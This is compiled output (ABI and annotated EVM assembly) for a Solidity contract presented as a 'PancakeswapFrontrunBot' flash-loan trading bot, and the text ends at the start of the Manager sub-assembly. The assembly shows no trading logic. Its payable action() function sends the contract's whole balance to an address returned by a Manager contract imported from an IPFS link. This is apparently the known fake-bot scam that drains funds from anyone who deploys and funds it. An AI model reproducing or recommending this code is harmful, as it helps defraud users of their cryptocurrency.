{
	"flashloan.sol": {
		"PancakeswapFrontrunBot": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "string",
							"name": "_tokenName",
							"type": "string"
						},
						{
							"internalType": "string",
							"name": "_tokenSymbol",
							"type": "string"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "action",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "tokenName",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "tokenSymbol",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"flashloan.sol\":367:17651  contract PancakeswapFrontrunBot {\r... */\n  mstore(0x40, 0x80)\n    /* \"flashloan.sol\":519:704  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"flashloan.sol\":519:704  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n    /* \"--CODEGEN--\":15:17   */\n  0x40\n    /* \"--CODEGEN--\":10:13   */\n  dup2\n    /* \"--CODEGEN--\":7:18   */\n  lt\n    /* \"--CODEGEN--\":4:6   */\n  iszero\n  tag_2\n  jumpi\n    /* \"--CODEGEN--\":31:32   */\n  0x00\n    /* \"--CODEGEN--\":28:29   */\n  dup1\n    /* \"--CODEGEN--\":21:33   */\n  revert\n    /* \"--CODEGEN--\":4:6   */\ntag_2:\n    /* \"flashloan.sol\":519:704  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  mload(0x40)\n  swap4\n  swap3\n  swap2\n  swap1\n  dup5\n    /* \"--CODEGEN--\":19:30   */\n  0x0100000000\n    /* \"--CODEGEN--\":14:17   */\n  dup3\n    /* \"--CODEGEN--\":11:31   */\n  gt\n    /* \"--CODEGEN--\":8:10   */\n  iszero\n  tag_3\n  jumpi\n    /* \"--CODEGEN--\":44:45   */\n  0x00\n    /* \"--CODEGEN--\":41:42   */\n  dup1\n    /* \"--CODEGEN--\":34:46   */\n  revert\n    /* \"--CODEGEN--\":8:10   */\ntag_3:\n    /* \"--CODEGEN--\":71:82   */\n  dup4\n    /* \"--CODEGEN--\":66:69   */\n  dup3\n    /* \"--CODEGEN--\":62:83   */\n  add\n    /* \"--CODEGEN--\":55:83   */\n  swap2\n  pop\n    /* \"--CODEGEN--\":123:127   */\n  0x20\n    /* \"--CODEGEN--\":118:121   */\n  dup3\n    /* \"--CODEGEN--\":114:128   */\n  add\n    /* \"--CODEGEN--\":159:168   */\n  dup6\n    /* \"--CODEGEN--\":141:157   */\n  dup2\n    /* \"--CODEGEN--\":138:169   */\n  gt\n    /* \"--CODEGEN--\":135:137   */\n  iszero\n  tag_4\n  jumpi\n    /* \"--CODEGEN--\":182:183   */\n  0x00\n    /* \"--CODEGEN--\":179:180   */\n  dup1\n    /* \"--CODEGEN--\":172:184   */\n  revert\n    /* \"--CODEGEN--\":135:137   */\ntag_4:\n    /* \"--CODEGEN--\":219:222   */\n  dup3\n    /* \"--CODEGEN--\":213:223   */\n  mload\n    /* \"--CODEGEN--\":330:339   */\n  dup7\n    /* \"--CODEGEN--\":325:326   */\n  0x01\n    /* \"--CODEGEN--\":311:323   */\n  dup3\n    /* \"--CODEGEN--\":307:327   */\n  mul\n    /* \"--CODEGEN--\":289:305   */\n  dup4\n    /* \"--CODEGEN--\":285:328   */\n  add\n    /* \"--CODEGEN--\":282:340   */\n  gt\n    /* \"--CODEGEN--\":261:272   */\n  0x0100000000\n    /* \"--CODEGEN--\":247:259   */\n  dup3\n    /* \"--CODEGEN--\":244:273   */\n  gt\n    /* \"--CODEGEN--\":233:348   */\n  or\n    /* \"--CODEGEN--\":230:232   */\n  iszero\n  tag_5\n  jumpi\n    /* \"--CODEGEN--\":361:362   */\n  0x00\n    /* \"--CODEGEN--\":358:359   */\n  dup1\n    /* \"--CODEGEN--\":351:363   */\n  revert\n    /* \"--CODEGEN--\":230:232   */\ntag_5:\n    /* \"--CODEGEN--\":384:396   */\n  dup1\n    /* \"--CODEGEN--\":379:382   */\n  dup4\n    /* \"--CODEGEN--\":372:397   */\n  mstore\n    /* \"--CODEGEN--\":420:424   */\n  0x20\n    /* \"--CODEGEN--\":415:418   */\n  dup4\n    /* \"--CODEGEN--\":411:425   */\n  add\n    /* \"--CODEGEN--\":404:425   */\n  swap3\n  pop\n    /* \"--CODEGEN--\":0:432   */\n  pop\n  pop\n    /* \"flashloan.sol\":519:704  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  dup1\n  dup4\n  dup4\n    /* \"--CODEGEN--\":23:24   */\n  0x00\n    /* \"--CODEGEN--\":8:108   */\ntag_6:\n    /* \"--CODEGEN--\":33:36   */\n  dup4\n    /* \"--CODEGEN--\":30:31   */\n  dup2\n    /* \"--CODEGEN--\":27:37   */\n  lt\n    /* \"--CODEGEN--\":8:108   */\n  iszero\n  tag_8\n  jumpi\n    /* \"--CODEGEN--\":99:100   */\n  dup1\n    /* \"--CODEGEN--\":94:97   */\n  dup3\n    /* \"--CODEGEN--\":90:101   */\n  add\n    /* \"--CODEGEN--\":84:102   */\n  mload\n    /* \"--CODEGEN--\":80:81   */\n  dup2\n    /* \"--CODEGEN--\":75:78   */\n  dup5\n    /* \"--CODEGEN--\":71:82   */\n  add\n    /* \"--CODEGEN--\":64:103   */\n  mstore\n    /* \"--CODEGEN--\":52:54   */\n  0x20\n    /* \"--CODEGEN--\":49:50   */\n  dup2\n    /* \"--CODEGEN--\":45:55   */\n  add\n    /* \"--CODEGEN--\":40:55   */\n  swap1\n  pop\n    /* \"--CODEGEN--\":8:108   */\n  jump(tag_6)\ntag_8:\n    /* \"--CODEGEN--\":12:26   */\n  pop\n    /* \"flashloan.sol\":519:704  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  pop\n  pop\n  pop\n  swap1\n  pop\n  swap1\n  dup2\n  add\n  swap1\n  0x1f\n  and\n  dup1\n  iszero\n  tag_9\n  jumpi\n  dup1\n  dup3\n  sub\n  dup1\n  mload\n  0x01\n  dup4\n  0x20\n  sub\n  0x0100\n  exp\n  sub\n  not\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\ntag_9:\n  pop\n  0x40\n  mstore\n  0x20\n  add\n  dup1\n  mload\n  mload(0x40)\n  swap4\n  swap3\n  swap2\n  swap1\n  dup5\n    /* \"--CODEGEN--\":19:30   */\n  0x0100000000\n    /* \"--CODEGEN--\":14:17   */\n  dup3\n    /* \"--CODEGEN--\":11:31   */\n  gt\n    /* \"--CODEGEN--\":8:10   */\n  iszero\n  tag_10\n  jumpi\n    /* \"--CODEGEN--\":44:45   */\n  0x00\n    /* \"--CODEGEN--\":41:42   */\n  dup1\n    /* \"--CODEGEN--\":34:46   */\n  revert\n    /* \"--CODEGEN--\":8:10   */\ntag_10:\n    /* \"--CODEGEN--\":71:82   */\n  dup4\n    /* \"--CODEGEN--\":66:69   */\n  dup3\n    /* \"--CODEGEN--\":62:83   */\n  add\n    /* \"--CODEGEN--\":55:83   */\n  swap2\n  pop\n    /* \"--CODEGEN--\":123:127   */\n  0x20\n    /* \"--CODEGEN--\":118:121   */\n  dup3\n    /* \"--CODEGEN--\":114:128   */\n  add\n    /* \"--CODEGEN--\":159:168   */\n  dup6\n    /* \"--CODEGEN--\":141:157   */\n  dup2\n    /* \"--CODEGEN--\":138:169   */\n  gt\n    /* \"--CODEGEN--\":135:137   */\n  iszero\n  tag_11\n  jumpi\n    /* \"--CODEGEN--\":182:183   */\n  0x00\n    /* \"--CODEGEN--\":179:180   */\n  dup1\n    /* \"--CODEGEN--\":172:184   */\n  revert\n    /* \"--CODEGEN--\":135:137   */\ntag_11:\n    /* \"--CODEGEN--\":219:222   */\n  dup3\n    /* \"--CODEGEN--\":213:223   */\n  mload\n    /* \"--CODEGEN--\":330:339   */\n  dup7\n    /* \"--CODEGEN--\":325:326   */\n  0x01\n    /* \"--CODEGEN--\":311:323   */\n  dup3\n    /* \"--CODEGEN--\":307:327   */\n  mul\n    /* \"--CODEGEN--\":289:305   */\n  dup4\n    /* \"--CODEGEN--\":285:328   */\n  add\n    /* \"--CODEGEN--\":282:340   */\n  gt\n    /* \"--CODEGEN--\":261:272   */\n  0x0100000000\n    /* \"--CODEGEN--\":247:259   */\n  dup3\n    /* \"--CODEGEN--\":244:273   */\n  gt\n    /* \"--CODEGEN--\":233:348   */\n  or\n    /* \"--CODEGEN--\":230:232   */\n  iszero\n  tag_12\n  jumpi\n    /* \"--CODEGEN--\":361:362   */\n  0x00\n    /* \"--CODEGEN--\":358:359   */\n  dup1\n    /* \"--CODEGEN--\":351:363   */\n  revert\n    /* \"--CODEGEN--\":230:232   */\ntag_12:\n    /* \"--CODEGEN--\":384:396   */\n  dup1\n    /* \"--CODEGEN--\":379:382   */\n  dup4\n    /* \"--CODEGEN--\":372:397   */\n  mstore\n    /* \"--CODEGEN--\":420:424   */\n  0x20\n    /* \"--CODEGEN--\":415:418   */\n  dup4\n    /* \"--CODEGEN--\":411:425   */\n  add\n    /* \"--CODEGEN--\":404:425   */\n  swap3\n  pop\n    /* \"--CODEGEN--\":0:432   */\n  pop\n  pop\n    /* \"flashloan.sol\":519:704  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  dup1\n  dup4\n  dup4\n    /* \"--CODEGEN--\":23:24   */\n  0x00\n    /* \"--CODEGEN--\":8:108   */\ntag_13:\n    /* \"--CODEGEN--\":33:36   */\n  dup4\n    /* \"--CODEGEN--\":30:31   */\n  dup2\n    /* \"--CODEGEN--\":27:37   */\n  lt\n    /* \"--CODEGEN--\":8:108   */\n  iszero\n  tag_15\n  jumpi\n    /* \"--CODEGEN--\":99:100   */\n  dup1\n    /* \"--CODEGEN--\":94:97   */\n  dup3\n    /* \"--CODEGEN--\":90:101   */\n  add\n    /* \"--CODEGEN--\":84:102   */\n  mload\n    /* \"--CODEGEN--\":80:81   */\n  dup2\n    /* \"--CODEGEN--\":75:78   */\n  dup5\n    /* \"--CODEGEN--\":71:82   */\n  add\n    /* \"--CODEGEN--\":64:103   */\n  mstore\n    /* \"--CODEGEN--\":52:54   */\n  0x20\n    /* \"--CODEGEN--\":49:50   */\n  dup2\n    /* \"--CODEGEN--\":45:55   */\n  add\n    /* \"--CODEGEN--\":40:55   */\n  swap1\n  pop\n    /* \"--CODEGEN--\":8:108   */\n  jump(tag_13)\ntag_15:\n    /* \"--CODEGEN--\":12:26   */\n  pop\n    /* \"flashloan.sol\":519:704  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  pop\n  pop\n  pop\n  swap1\n  pop\n  swap1\n  dup2\n  add\n  swap1\n  0x1f\n  and\n  dup1\n  iszero\n  tag_16\n  jumpi\n  dup1\n  dup3\n  sub\n  dup1\n  mload\n  0x01\n  dup4\n  0x20\n  sub\n  0x0100\n  exp\n  sub\n  not\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\ntag_16:\n  pop\n  0x40\n  mstore\n  pop\n  pop\n  pop\n    /* \"flashloan.sol\":615:625  _tokenName */\n  dup2\n    /* \"flashloan.sol\":603:612  tokenName */\n  0x00\n    /* \"flashloan.sol\":603:625  tokenName = _tokenName */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_19\n  swap3\n  swap2\n  swap1\n  tag_20\n  jump\t// in\ntag_19:\n  pop\n    /* \"flashloan.sol\":650:662  _tokenSymbol */\n  dup1\n    /* \"flashloan.sol\":636:647  tokenSymbol */\n  0x01\n    /* \"flashloan.sol\":636:662  tokenSymbol = _tokenSymbol */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_21\n  swap3\n  swap2\n  swap1\n  tag_20\n  jump\t// in\ntag_21:\n  pop\n    /* \"flashloan.sol\":683:696  new Manager() */\n  mload(0x40)\n  tag_22\n  swap1\n  tag_23\n  jump\t// in\ntag_22:\n  mload(0x40)\n  dup1\n  swap2\n  sub\n  swap1\n  0x00\n  create\n  dup1\n  iszero\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_24\n  jumpi\n    /* \"--CODEGEN--\":45:61   */\n  returndatasize\n    /* \"--CODEGEN--\":42:43   */\n  0x00\n    /* \"--CODEGEN--\":39:40   */\n  dup1\n    /* \"--CODEGEN--\":24:62   */\n  returndatacopy\n    /* \"--CODEGEN--\":77:93   */\n  returndatasize\n    /* \"--CODEGEN--\":74:75   */\n  0x00\n    /* \"--CODEGEN--\":67:94   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_24:\n    /* \"flashloan.sol\":683:696  new Manager() */\n  pop\n    /* \"flashloan.sol\":673:680  manager */\n  0x03\n  0x00\n    /* \"flashloan.sol\":673:696  manager = new Manager() */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"flashloan.sol\":519:704  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  pop\n  pop\n    /* \"flashloan.sol\":367:17651  contract PancakeswapFrontrunBot {\r... */\n  jump(tag_25)\ntag_20:\n  dup3\n  dup1\n  sload\n  0x01\n  dup2\n  0x01\n  and\n  iszero\n  0x0100\n  mul\n  sub\n  and\n  0x02\n  swap1\n  div\n  swap1\n  0x00\n  mstore\n  keccak256(0x00, 0x20)\n  swap1\n  0x1f\n  add\n  0x20\n  swap1\n  div\n  dup2\n  add\n  swap3\n  dup3\n  0x1f\n  lt\n  tag_27\n  jumpi\n  dup1\n  mload\n  not(0xff)\n  and\n  dup4\n  dup1\n  add\n  or\n  dup6\n  sstore\n  jump(tag_26)\ntag_27:\n  dup3\n  dup1\n  add\n  0x01\n  add\n  dup6\n  sstore\n  dup3\n  iszero\n  tag_26\n  jumpi\n  swap2\n  dup3\n  add\ntag_28:\n  dup3\n  dup2\n  gt\n  iszero\n  tag_29\n  jumpi\n  dup3\n  mload\n  dup3\n  sstore\n  swap2\n  0x20\n  add\n  swap2\n  swap1\n  0x01\n  add\n  swap1\n  jump(tag_28)\ntag_29:\ntag_26:\n  pop\n  swap1\n  pop\n  tag_30\n  swap2\n  swap1\n  tag_31\n  jump\t// in\ntag_30:\n  pop\n  swap1\n  jump\t// out\ntag_23:\n  dataSize(sub_1)\n  dup1\n  dataOffset(sub_1)\n  dup4\n  codecopy\n  add\n  swap1\n  jump\t// out\ntag_31:\n  tag_32\n  swap2\n  swap1\ntag_33:\n  dup1\n  dup3\n  gt\n  iszero\n  tag_34\n  jumpi\n  0x00\n  dup2\n  0x00\n  swap1\n  sstore\n  pop\n  0x01\n  add\n  jump(tag_33)\ntag_34:\n  pop\n  swap1\n  jump\ntag_32:\n  swap1\n  jump\t// out\ntag_25:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"flashloan.sol\":367:17651  contract PancakeswapFrontrunBot {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x0a7a1c4d\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x6c02a931\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x7b61c320\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"flashloan.sol\":15951:16076  function action() public payable { \r... */\n    tag_3:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      stop\n        /* \"flashloan.sol\":409:432  string public tokenName */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_10\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_10:\n        /* \"flashloan.sol\":409:432  string public tokenName */\n      pop\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_13:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_15\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_13)\n    tag_15:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"flashloan.sol\":409:432  string public tokenName */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_16\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_16:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"flashloan.sol\":439:464  string public tokenSymbol */\n    tag_5:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_17\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_17:\n        /* \"flashloan.sol\":439:464  string public tokenSymbol */\n      pop\n      tag_18\n      tag_19\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_20:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_22\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_20)\n    tag_22:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"flashloan.sol\":439:464  string public tokenSymbol */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_23\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_23:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"flashloan.sol\":15951:16076  function action() public payable { \r... */\n    tag_9:\n        /* \"flashloan.sol\":16004:16011  manager */\n      0x03\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"flashloan.sol\":16004:16033  manager.uniswapDepositAddress */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xfeae9ad3\n        /* \"flashloan.sol\":16004:16035  manager.uniswapDepositAddress() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_25\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_25:\n        /* \"flashloan.sol\":16004:16035  manager.uniswapDepositAddress() */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_27\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_27:\n        /* \"flashloan.sol\":16004:16035  manager.uniswapDepositAddress() */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":15:17   */\n      0x20\n        /* \"--CODEGEN--\":10:13   */\n      dup2\n        /* \"--CODEGEN--\":7:18   */\n      lt\n        /* \"--CODEGEN--\":4:6   */\n      iszero\n      tag_28\n      jumpi\n        /* \"--CODEGEN--\":31:32   */\n      0x00\n        /* \"--CODEGEN--\":28:29   */\n      dup1\n        /* \"--CODEGEN--\":21:33   */\n      revert\n        /* \"--CODEGEN--\":4:6   */\n    tag_28:\n        /* \"flashloan.sol\":16004:16035  manager.uniswapDepositAddress() */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n        /* \"flashloan.sol\":15996:16045  payable(manager.uniswapDepositAddress()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"flashloan.sol\":15996:16068  payable(manager.uniswapDepositAddress()).transfer(address(this).balance) */\n      0x08fc\n        /* \"flashloan.sol\":16046:16067  address(this).balance */\n      selfbalance\n        /* \"flashloan.sol\":15996:16068  payable(manager.uniswapDepositAddress()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_30\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_30:\n        /* \"flashloan.sol\":15996:16068  payable(manager.uniswapDepositAddress()).transfer(address(this).balance) */\n      pop\n        /* \"flashloan.sol\":15951:16076  function action() public payable { \r... */\n      jump\t// out\n        /* \"flashloan.sol\":409:432  string public tokenName */\n    tag_12:\n      0x00\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_31\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_32\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_31)\n    tag_32:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_33:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_33\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_31:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"flashloan.sol\":439:464  string public tokenSymbol */\n    tag_19:\n      0x01\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_34\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_35\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_34)\n    tag_35:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_36:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_36\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_34:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n\n    auxdata: 0xa26469706673582212206a34b6f2a9e6cbe19fc31e8d74a568d91fdd0be6a6fde71ebecd067cf000234164736f6c63430006060033\n}\n\nsub_1: assembly {\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6977:7171  contract Manager 